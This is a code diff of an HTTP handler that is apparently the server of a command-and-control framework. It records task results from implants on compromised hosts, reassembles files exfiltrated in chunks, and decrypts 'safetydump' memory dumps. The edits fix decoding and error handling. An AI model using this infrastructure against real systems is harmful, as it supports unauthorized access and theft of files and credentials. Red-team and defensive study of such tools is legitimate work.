@@ -318,8 +318,11 @@ class MyHandler(BaseHTTPRequestHandler):
                         print("Task %s (%s) returned against implant %s on host %s\\%s @ %s (%s)" % (taskIdStr, task_owner, implantID, Domain, User, Hostname, now.strftime("%d/%m/%Y %H:%M:%S")))
                     else:
                         print("Task %s returned against implant %s on host %s\\%s @ %s (%s)" % (taskIdStr, implantID, Domain, User, Hostname, now.strftime("%d/%m/%Y %H:%M:%S")))
-                    outputParsed = re.sub(r'123456(.+?)654321', '', rawoutput)
-                    outputParsed = outputParsed.rstrip()
+                    try:
+                        outputParsed = re.sub(r'123456(.+?)654321', '', rawoutput)
+                        outputParsed = outputParsed.rstrip()
+                    except:
+                        pass
 
                     if "loadmodule" in executedCmd:
                         print("Module loaded successfully")
@@ -353,47 +356,46 @@ class MyHandler(BaseHTTPRequestHandler):
                             filename = filename.rsplit('\\', 1)[-1]
                             filename = filename.rstrip('\x00')
                             original_filename = filename
-                            if rawoutput.startswith("Error"):
-                                print("Error downloading file: ")
-                                print(rawoutput)
-                            else:
-                                chunkNumber = rawoutput[:5]
-                                totalChunks = rawoutput[5:10]
-                                if (chunkNumber == "00001") and os.path.isfile('%s/downloads/%s' % (ROOTDIR, filename)):
-                                    counter = 1
-                                    while(os.path.isfile('%s/downloads/%s' % (ROOTDIR, filename))):
-                                        if '.' in filename:
-                                            filename = original_filename[:original_filename.rfind('.')] + '-' + str(counter) + original_filename[original_filename.rfind('.'):]
-                                        else:
-                                            filename = original_filename + '-' + str(counter)
-                                        counter += 1
-                                if (chunkNumber != "00001"):
-                                    counter = 1
-                                    if not os.path.isfile('%s/downloads/%s' % (ROOTDIR, filename)):
-                                        print("Error trying to download part of a file to a file that does not exist: %s" % filename)
-                                    while(os.path.isfile('%s/downloads/%s' % (ROOTDIR, filename))):
-                                        # First find the 'next' file would be downloaded to
-                                        if '.' in filename:
-                                            filename = original_filename[:original_filename.rfind('.')] + '-' + str(counter) + original_filename[original_filename.rfind('.'):]
-                                        else:
-                                            filename = original_filename + '-' + str(counter)
-                                        counter += 1
-                                    if counter != 2:
-                                        # Then actually set the filename to this file - 1 unless it's the first one and exists without a counter
-                                        if '.' in filename:
-                                            filename = original_filename[:original_filename.rfind('.')] + '-' + str(counter) + original_filename[original_filename.rfind('.'):]
-                                        else:
-                                            filename = original_filename + '-' + str(counter)
+                            chunkNumber = rawoutput[:5].decode("utf-8")
+                            print (chunkNumber)
+                            totalChunks = rawoutput[5:10].decode("utf-8")
+                            print (totalChunks)
+                            if (chunkNumber == "00001") and os.path.isfile('%s/downloads/%s' % (ROOTDIR, filename)):
+                                counter = 1
+                                while(os.path.isfile('%s/downloads/%s' % (ROOTDIR, filename))):
+                                    if '.' in filename:
+                                        filename = original_filename[:original_filename.rfind('.')] + '-' + str(counter) + original_filename[original_filename.rfind('.'):]
                                     else:
-                                        filename = original_filename
-                                print("Download file part %s of %s to: %s" % (chunkNumber, totalChunks, filename))
-                                update_task(taskId, "Download file part %s of %s to: %s" % (chunkNumber, totalChunks, filename))
-                                output_file = open('%s/downloads/%s' % (ROOTDIR, filename), 'a')
-                                output_file.write(rawoutput[10:])
-                                output_file.close()
+                                        filename = original_filename + '-' + str(counter)
+                                    counter += 1
+                            if (chunkNumber != "00001"):
+                                counter = 1
+                                if not os.path.isfile('%s/downloads/%s' % (ROOTDIR, filename)):
+                                    print("Error trying to download part of a file to a file that does not exist: %s" % filename)
+                                while(os.path.isfile('%s/downloads/%s' % (ROOTDIR, filename))):
+                                    # First find the 'next' file would be downloaded to
+                                    if '.' in filename:
+                                        filename = original_filename[:original_filename.rfind('.')] + '-' + str(counter) + original_filename[original_filename.rfind('.'):]
+                                    else:
+                                        filename = original_filename + '-' + str(counter)
+                                    counter += 1
+                                if counter != 2:
+                                    # Then actually set the filename to this file - 1 unless it's the first one and exists without a counter
+                                    if '.' in filename:
+                                        filename = original_filename[:original_filename.rfind('.')] + '-' + str(counter) + original_filename[original_filename.rfind('.'):]
+                                    else:
+                                        filename = original_filename + '-' + str(counter)
+                                else:
+                                    filename = original_filename
+                            print("Download file part %s of %s to: %s" % (chunkNumber, totalChunks, filename))
+                            update_task(taskId, "Download file part %s of %s to: %s" % (chunkNumber, totalChunks, filename))
+                            output_file = open('%s/downloads/%s' % (ROOTDIR, filename), 'ab')
+                            output_file.write(rawoutput[10:])
+                            output_file.close()
                         except Exception as e:
                             update_task(taskId, "Error downloading file %s " % e)
                             print("Error downloading file %s " % e)
+                            traceback.print_exc()
 
                     elif "safetydump" in executedCmd.lower():
                         rawoutput = decrypt_bytes_gzip(encKey, post_data[1500:])
@@ -411,7 +413,7 @@ class MyHandler(BaseHTTPRequestHandler):
                         update_task(taskId, outputParsed)
                         print(Colours.GREEN)
                         print(outputParsed + Colours.END)
-        except Exception:
+        except Exception as e:
             print (e)
             traceback.print_exc()
             pass
